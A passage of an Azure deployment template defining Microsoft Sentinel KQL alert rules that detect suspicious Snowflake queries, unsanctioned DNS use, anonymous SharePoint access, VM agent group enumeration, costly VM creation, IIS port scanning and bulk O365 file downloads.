          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3e259da8-1d62-488e-a356-e9b8f9df3a97')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3e259da8-1d62-488e-a356-e9b8f9df3a97')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Suspicious Unknown Snowflake Queries",
          "description": "This rule monitors queries on the Snowflake data platform and alerts when it detects any unusual queries that do not match the patterns of known authorized automated queries. It focuses on detecting new activity and ensures that only approved queries are running.  DCSS Custom Rule created on 10/30/24 by AMayor",
          "severity": "Medium",
          "enabled": true,
          "query": "Snowflake_CL\n| where USER_NAME_s == \"SENTINEL_SVC_USER\"\n| where isnotnull(QUERY_TEXT_s) and QUERY_TEXT_s != \"\"  // Exclude null and empty valuesre QUERY_TEXT_s != \" \"  \n| where QUERY_TEXT_s !contains \"LOGIN_HISTORY WHERE EVENT_TIMESTAMP\" and QUERY_TEXT_s !contains \"QUERY_HISTORY WHERE START_TIME\" and QUERY_TEXT_s !in (\"use schema snowflake.account_usage\", \"use schema snowflake.reader_account_usage\") //Exlude Known Queries by SENTINEL_SVC_USER\n| project TimeGenerated, QUERY_TEXT_s, USER_NAME_s, EXECUTION_STATUS_s, SCHEMA_NAME_s, START_TIME_t, END_TIME_t\n",
          "queryFrequency": "PT5M",
          "queryPeriod": "PT5M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection",
            "CredentialAccess",
            "Discovery"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-036')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-036')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-036: [Hygiene] Cisco ASA - Internal hosts using unsanctioned DNS servers",
          "description": "This alert indicates that internal hosts are using DNS servers that are not on the list of authorized DNS servers. MITRE: T1583 Category: Cisco ASA tag: Hygiene",
          "severity": "Low",
          "enabled": true,
          "query": "cisco_asa_traffic\n| where TimeGenerated between (ago(1h) .. now())\n| where Protocol == 'UDP/53' or Protocol == 'TCP/53'\n| where SourceIP !in (SANCTIONED_DNS_SERVERS)      \n| where DestinationIP !in (SANCTIONED_DNS_SERVERS)\n| summarize Connections=count(),DestinationIPs=make_set(DestinationIP),CountDestIPs=dcount(DestinationIP),Protocols=make_set(Protocol),CountProtocols=dcount(Protocol) by IPCustomEntity = SourceIP,bin(TimeGenerated,1h)\n| sort by Connections desc",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "ResourceDevelopment"
          ],
          "techniques": [
            "T1583"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-011')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-011')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-011: [RBA] O365 - Anonymous Sharepoint Link accessed",
          "description": "This alert detects when an anonymous link created in Sharepoint has been used. The anonymous link allow access to the shared document without any credentials. MITRE: T1213 Category: Office 365 tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "let ingested_lookback = 1d; // earliest [ingest time] boundary\nlet generated_lookback = 3d; // earliest [log time] boundary\nOfficeActivity\n| where TimeGenerated > ago(generated_lookback) and ingestion_time() > ago(ingested_lookback)\n| where Operation =~ 'AnonymousLinkUsed'\n| project TimeGenerated, RecordType, SourceRelativeUrl, Site_Url, IPCustomEntity=ClientIP, UserAgent\n| summarize CountofEvents= count(), starttime=min(TimeGenerated), endtime=max(TimeGenerated), IPList = make_set(IPCustomEntity), RecordTypes = make_set(RecordType), SourceRelativeUrls = make_set(SourceRelativeUrl), Site_Urls = make_set(Site_Url) by UserAgent, bin(TimeGenerated, 1d)\n| sort by CountofEvents desc",
          "queryFrequency": "P1D",
          "queryPeriod": "P3D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1213"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1511')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1511')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1511: [RBA] Windows - Azure VM Agent Group Enumeration",
          "description": "This alerts when the VMAccessAgent process enumerates the members of a security-enabled local group on the computer or device. The VMAccessAgent extension is used to enable Remote Desktop and facilitate a password reset of an admin account. MITRE: T1069 Category: Windows Security tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic([4799]);\nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;\nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV1511_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV1511_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};      \nSecurityEvent\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where CallerProcessName has 'vmaccessagent'\n| project \n    bv_user = TargetUserName\n    , bv_user_id = TargetUserSid\n    , bv_src_user = SubjectUserName\n    , bv_src_user_id = SubjectUserSid\n    , bv_object = TargetUserName\n    , bv_object_id = TargetUserSid\n    , bv_change_action      = 'access'\n    , bv_change_category    = 'group'\n    , bv_change_result      = 'success'\n    , bv_mitre_technique_id = 'T1069'\n    , bv_process            = CallerProcessName\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_alert_time = now()\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'SecurityEvent'\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-1511')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_object)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user)\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription           ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery"
          ],
          "techniques": [
            "T1069"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-1511: [RBA] Windows - Azure VM Agent Group Enumeration",
            "alertDescriptionFormat": "This alerts when the VMAccessAgent process enumerates the members of a security-enabled local group on the computer or device. The VMAccessAgent extension is used to enable Remote Desktop and facilitate a password reset of an admin account.\n\n{{ExtendedDescription}}\n\nMITRE: T1069\nCategory: Windows Security\ntag: RBA"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-406')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-406')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-406: [RBA] Azure Activity - Creation of Expensive Computes",
          "description": "Identifies the creation of large size/expensive VMs (GPU or with large no of virtual CPUs) in Azure. Adversary may create new or update existing virtual machines sizes to evade defenses or use it for cryptomining purposes. For Windows/Linux Vm Sizes - https://docs.microsoft.com/azure/virtual-machines/windows/sizes Azure VM Naming Conventions - https://docs.microsoft.com/azure/virtual-machines/vm-naming-conventions MITRE: T1578 Category: Azure Activity tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let generated_lookback = 1d;\nlet tokens = dynamic(['416','208','128','120','96','80','72','64','48','44','40','g5','gs5','g4','gs4','nc12','nc24','nv12']);\nlet operationList = dynamic(['Microsoft.Compute/virtualMachines/write', 'Microsoft.Resources/deployments/write']);\nAzureActivity\n| where TimeGenerated between (ago(generated_lookback) .. now())\n| extend Action = tostring(parse_json(Authorization).action)\n| extend OperationNameValue = iff(isempty(OperationNameValue), Action, OperationNameValue)\n| where OperationNameValue in~ (operationList)\n| where ActivityStatusValue == 'Accepted'\n| where isnotempty(Properties)\n| extend vmSize = tolower(tostring(parse_json(tostring(parse_json(tostring(parse_json(tostring(parse_json(Properties).responseBody)).properties)).hardwareProfile)).vmSize))\n| where isnotempty(vmSize)\n| where vmSize has_any (tokens) \n| extend ComputerName = tostring(parse_json(tostring(parse_json(tostring(parse_json(tostring(parse_json(Properties).responseBody)).properties)).osProfile)).computerName)\n| extend clientIpAddress = tostring(parse_json(HTTPRequest).clientIpAddress)\n| extend AccountCustomEntity = Caller, IPCustomEntity = CallerIpAddress\n| project\n    TimeGenerated,\n    OperationNameValue,\n    ActivityStatusValue,\n    Caller,\n    CallerIpAddress,\n    ComputerName,\n    vmSize,\n    AccountCustomEntity,\n    IPCustomEntity",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1578"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-145')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-145')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-145: [RBA] IIS - High count of connections by client IP on many ports",
          "description": "Identifies when 30 or more ports are used for a given client IP in 15 minutes occurring on the IIS server. This could be indicative of attempted port scanning or exploit attempt at internet facing web applications. This could also simply indicate a misconfigured service or device.  References: IIS status code mapping - https://support.microsoft.com/en-us/help/943891/the-http-status-code-in-iis-7-0-iis-7-5-and-iis-8-0 Win32 Status code mapping - https://msdn.microsoft.com/en-us/library/cc231199.aspx. MITRE: T1046 Category: IIS tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeBin = 15m;\nlet portThreshold = 30;\nW3CIISLog\n| where TimeGenerated >= ago(timeBin)\n| project TimeGenerated,scStatus,scSubStatus,scWin32Status,sPort,csUserName,sSiteName,csUserAgent,csMethod,csUriQuery,cIP,Computer,sIP\n| extend scStatusFull = strcat(scStatus, '.',scSubStatus) \n// Map common IIS codes\n| extend scStatusFull_Friendly = case(\nscStatusFull == '401.0', 'Access denied.',\nscStatusFull == '401.1', 'Logon failed.',\nscStatusFull == '401.2', 'Logon failed due to server configuration.',\nscStatusFull == '401.3', 'Unauthorized due to ACL on resource.',\nscStatusFull == '401.4', 'Authorization failed by filter.',\nscStatusFull == '401.5', 'Authorization failed by ISAPI/CGI application.',\nscStatusFull == '403.0', 'Forbidden.',\nscStatusFull == '403.4', 'SSL required.',\n'See - https://support.microsoft.com/en-us/help/943891/the-http-status-code-in-iis-7-0-iis-7-5-and-iis-8-0')\n// Mapping to Hex so can be mapped using website in comments above\n| extend scWin32Status_Hex = tohex(tolong(scWin32Status)) \n// Map common win32 codes\n| extend scWin32Status_Friendly = case(\nscWin32Status_Hex =~ '775', 'The referenced account is currently locked out and cannot be logged on to.',\nscWin32Status_Hex =~ '52e', 'Logon failure: Unknown user name or bad password.',\nscWin32Status_Hex =~ '532', 'Logon failure: The specified account password has expired.',\nscWin32Status_Hex =~ '533', 'Logon failure: Account currently disabled.', \nscWin32Status_Hex =~ '2ee2', 'The request has timed out.', \nscWin32Status_Hex =~ '0', 'The operation completed successfully.', \nscWin32Status_Hex =~ '1', 'Incorrect function.', \nscWin32Status_Hex =~ '2', 'The system cannot find the file specified.', \nscWin32Status_Hex =~ '3', 'The system cannot find the path specified.', \nscWin32Status_Hex =~ '4', 'The system cannot open the file.', \nscWin32Status_Hex =~ '5', 'Access is denied.', \nscWin32Status_Hex =~ '8009030e', 'SEC_E_NO_CREDENTIALS', \nscWin32Status_Hex =~ '8009030C', 'SEC_E_LOGON_DENIED', \n'See - https://msdn.microsoft.com/en-us/library/cc231199.aspx')\n// decode URI when available\n| extend decodedUriQuery = url_decode(csUriQuery)\n// Count of attempts by client IP on many ports\n| summarize make_set(sPort, 5)\n, make_set(decodedUriQuery, 5)\n, make_set(csUserName, 5)\n, make_set(sSiteName, 5)\n, make_set(sPort, 5)\n, make_set(csUserAgent, 5)\n, make_set(csMethod, 5)\n, make_set(csUriQuery, 5)\n, make_set(scStatusFull, 5)\n, make_set(scStatusFull_Friendly, 5)\n, make_set(scWin32Status_Hex, 5)\n, make_set(scWin32Status_Friendly, 5)\n, ConnectionsCount = count() by bin(TimeGenerated, timeBin), cIP, Computer, sIP\n| extend portCount = arraylength(set_sPort)\n| where portCount >= portThreshold\n| project TimeGenerated, cIP, set_sPort, set_csUserName, set_decodedUriQuery, Computer, set_sSiteName, sIP, set_csUserAgent, set_csMethod, set_scStatusFull, set_scStatusFull_Friendly, set_scWin32Status_Hex, set_scWin32Status_Friendly, ConnectionsCount, portCount\n| order by portCount\n| extend timestamp = TimeGenerated, IPCustomEntity = cIP",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT15M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery"
          ],
          "techniques": [
            "T1046"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11280')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11280')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11280: [RBA] O365 - Anomalous File Access",
          "description": "This alert identifies a large volume of files accessed via Office 365 logs MITRE: T1647 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1h;\nlet latency = 1h;\nlet end_time = now();\nlet start_time_historical = 7d;\nlet O365Activity = OfficeActivity\n| where TimeGenerated between (ago(start_time_historical) .. end_time)\n| where Operation in~ ('FileDownloaded', 'FileAccessed')\n| extend FolderOwner = parse_path(Site_Url)\n| extend bv_folder_owner = extract(@\"^([^:/]*)_(\\w*_\\w*)\", 1, tostring(FolderOwner.Filename))      \n| project \n      TimeGenerated\n    , bv_folder_owner\n    , bv_file_modify_time = Start_Time\n    , bv_src_user = tolower(extract(@'^([^@]*)', 1, UserId))\n    , bv_vendor_action = tolower(Operation)\n    , bv_src_ip = ClientIP\n    , bv_vendor_category = OfficeWorkload\n    , bv_parent_file_name = SourceFileName\n    , bv_file_name = DestinationFileName\n    , bv_file_extension = SourceFileExtension\n    , bv_file_path = OfficeObjectId\n    , bv_file_directory = SourceRelativeUrl\n;      \nlet historical_activity = toscalar(O365Activity      \n| where  TimeGenerated < ago(start_time)\n| summarize \n        bv_historical_file_modification_count = dcount(bv_parent_file_name)\n        , bv_historical_file_path = make_set(bv_file_path, 10)\n        by \n          bv_src_user\n| where bv_historical_file_modification_count >= 100\n| summarize make_set(bv_src_user)); \nO365Activity\n|where TimeGenerated > ago(start_time)\n| mv-apply e = BV11280_CONFIGURATION['EXCLUSION'] on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n        | extend bv_file_path_excluded = iff(bv_file_path contains e.bv_file_path and isnotempty(e.bv_file_path), 1, 0)   \n        | extend excluded_count = \n                bv_src_user_excluded\n                + bv_file_path_excluded   | extend transparent = iff(isnotempty(e.metadata[\"transparent\"]), e.metadata[\"transparent\"], true)\n        | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n        | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n        | summarize excluded=make_set(excluded), transparent=countif(transparent), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where ExcludedEvent == false or (ExcludedEvent == true and transparent == 0)\n| where not(ExcludedEvent)\n| summarize \n    bv_start_time = min(TimeGenerated)\n    , bv_end_time   = max(TimeGenerated)\n    , bv_event_count = count()\n    , bv_src_ip = make_set(bv_src_ip)\n    , bv_vendor_category = make_set(bv_vendor_category)\n    , bv_parent_file_name = make_set(bv_parent_file_name, 5)\n    , bv_file_name = make_set(bv_file_name, 5)\n    , bv_file_path = make_set(bv_file_path, 5)\n    , bv_file_extension = make_set(bv_file_extension, 5)\n    , bv_file_cnt = dcount(bv_parent_file_name)\n    , bv_file_directory_cnt = dcount(bv_file_directory)\n    , bv_folder_owner = make_set(bv_folder_owner)\n  by \n    bv_src_user, bv_vendor_action\n|extend AlertName = case(bv_vendor_action =~ 'filedownloaded' and bv_src_user in~ (historical_activity) and bv_folder_owner !contains bv_src_user, 'Multiple Files Downloaded From Different Directories'\n                      , bv_vendor_action =~ 'fileaccessed' and bv_file_cnt > 100 and bv_folder_owner contains bv_src_user, 'Multiple File Accessed By Same User'\n                      , bv_vendor_action =~ 'filedownloaded' and bv_file_directory_cnt == 1 and bv_file_cnt > 200, 'Multiple Files Downloaded From Single Directory'\n                      , bv_vendor_action =~ 'filedownloaded' and bv_file_cnt > 100 and datetime_diff('minute', bv_end_time, bv_start_time) < 15, 'Multiple Files Downloaded In Short Period'\n                      , '')\n| where isnotempty(AlertName)\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n      'bv_src_user: ', bv_src_user\n      , '\\nbv_file_cnt: ', bv_file_cnt\n      , '\\nbv_vendor_action: ', bv_vendor_action            \n      , '\\nbv_parent_file_name: \\n* ', strcat_array(bv_parent_file_name, '\\n* ')\n      , '\\nbv_file_name: \\n* ', strcat_array(bv_file_name, '\\n* ')                                             \n      , '\\nbv_vendor_category: \\n* ', strcat_array(array_slice(bv_vendor_category, 0, 150), '\\n* ')\n)\n| project   \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_vendor_action\n      , bv_vendor_category\n      , bv_event_count\n      , bv_src_ip\n      , bv_parent_file_name\n      , bv_folder_owner\n      , bv_file_name\n      , bv_file_path\n      , bv_file_extension\n      , bv_file_cnt\n      , AlertName\n      , ExtendedDescription            \n      , AttackerEntity\n      , RBAScore = BV11280_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1647"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11280: [RBA] O365 - {{AlertName}}",
            "alertDescriptionFormat": "This alert identifies a large volume of files accessed via Office 365 logs\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Office 365"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
